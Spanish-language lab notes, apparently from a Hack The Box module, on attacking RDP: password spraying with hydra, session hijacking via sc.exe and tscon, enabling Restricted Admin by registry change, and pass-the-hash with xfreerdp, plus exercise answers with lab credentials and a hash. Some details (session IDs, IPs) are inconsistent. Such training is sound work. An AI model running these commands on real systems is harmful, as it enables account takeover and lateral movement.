Por defecto, corre por el puert TCP/3389.

Partiendo de que conozcamos la contraseña del servidor RDP pero no el usuario, con la herramienta Crowbar podemos hacer un "spraying attack".

Generamos una lista de usuarios posibles:
```shell-session
Polika4RM@htb[/htb]# cat usernames.txt 

root
test
user
guest
admin
administrator
```

Y los atacamos con hydra:
```shell-session
Polika4RM@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
[DATA] attacking rdp://192.168.2.147:3389/
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
```

---

## RDP Login
Podemos loggearnos en un servicio RDP con *xfreerdp* o con *rdesktop*:
```shell-session
Polika4RM@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143

Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses an invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.
     Issuer: CN=WIN-Q8F2KTAI43A

Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate, the connection atempt will be aborted:

    Subject: CN=WIN-Q8F2KTAI43A
     Issuer: CN=WIN-Q8F2KTAI43A
 Valid From: Tue Aug 24 04:20:17 2021
         To: Wed Feb 23 03:20:17 2022

  Certificate fingerprints:

       sha1: cd43d32dc8e6b4d2804a59383e6ee06fefa6b12a
     sha256: f11c56744e0ac983ad69e1184a8249a48d0982eeb61ec302504d7ffb95ed6e57

Do you trust this certificate (yes/no)? yes
```

---

# Secuestro de cuenta que se conecta a RDP
Imaginemos que tenemos acceso a una maquina sobre la cual tenemos permisos de administrador. 
A esa máquina se conecta alguien por RDP, pues, si yo tengo permisos, podría llegar a comprometer la máquina del visitante y escalar privilegios o suplantar su cuenta. Si el que se conectase tuviese por casualidad permisos de administrador del Active Directory, podríamos llegar a controlar la cuenta del administrador del dominio.

Escenario:
En una máquina RDP estoy yo loggeado como el usuario "juurena" (el cual es admin), y queremos capturar la sesión de "lewen", quien está conectado mediante RDP.

Para suplantar la identidad de dicho usuario, necesitaré tener permisos de administrador y usar el ejecutable tscon.exe. 

Dentro de la maquina donde soy admin, con el comando:
```
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

puedo ver los usuarios actualmente conectados a la máquina. Lewen, tiene el ID=4.
El ejecutable "tscon.exe" necesita que le especifiquemos el ID de la sesión que vamos a atacar (ID=4 en este caso) y el nombre de la sesión a la que la queremos conectar (a rdp-tcp#13, la mía)

Por ejemplo, el siguiente comando abrirá una consola a la SESSION_ID especificada dentro de nuestra sesión RDP:
```cmd-session
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

Si tenemos privilegios de aministrador Local, podemos utilizar varios métodos para obtener  "privilegios de sistema" de cuentas ajenas, mediante el uso de herramientas como PsExec o Mimikatz.

Cuando un servicio se ejecuta como Local System significa que ese servicio se está ejecutando con permisos de administrador.
Pues para este ejercicio, crearemos un servicio crearemos un servicio windows que ejecutará como Local System y podrá ejecutar cualquier binario con privilegios de administrador.
El binario que utilizaremos será el "sc.exe".

Vamos a correr el siguiente comando baja un servicio llamado "sessionhijack":
```cmd-session
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```


Para ejecutar el comando, necesitaremos iniciar el servicio "sessionhijack", con:
```cmd-session
C:\htb> net start sessionhijack
```

Una vez iniciado el sistema, se nos abrirá una terminal del usuario "lewen". Con su sesión, podemos mirar que permisos tiene sobre la red y con un poco de suerte quizá pertenece al Help Desk group.

----

## RDP Pass-the-Hash (PtH)

Existe la posibilidad de conectarnos a un servicio RDP del cual solo tengamos el NT Hash y no su contraseña en texto plano.

Deberemos revisar que:
- El modo de administrador restringido, que está deshabilitado por defecto, debe estar habilitado en el host objetivo.

Esto se puede habilitar añadiendo una nueva clave de registro, DisableRestrictedAdmin (REG_DWORD), en HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa. 

Se puede hacer con el siguiente comando:

```cmd-session
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Una vez agregada la clave de registro, podemos usar xfreerdp con la opción /pth para obtener acceso RDP:

```shell-session
Polika4RM@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```
El "300FF5E89EF...BB9" es el HASH NTLM.

---
**Ejercicios**
Target:
**1. What is the name of the file that was left on the Desktop? (Format example: filename.txt)**
Executamos rdesktop:
```
rdesktop -u htb-rdp -p HTBRocks! 10.129.203.13
```

Y encuentro un archivo llamado pentest-notes.txt.
Respuesta: pentest-notes.txt

**2. Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?**
Respuesta teórica: DisableRestrictedAdmin

**3. Connect via RDP with the Administrator account and submit the flag.txt as you answer.**

El archivo contiene el siguiente contenido:
```
We found a hash from another machine Administrator account, we tried the hash in this computer but it didn't work, it doesn't have SMB or WinRM open, RDP Pass the Hash is not working.

User: Administrator
Hash: 0E14B9D6330BF16C30B1924111104824
```

Con el RDP de la sesión anterior, ejecuto:
```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Y finalmente, desde la máquina atacante ejecuto:
```
xfreerdp /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824
```

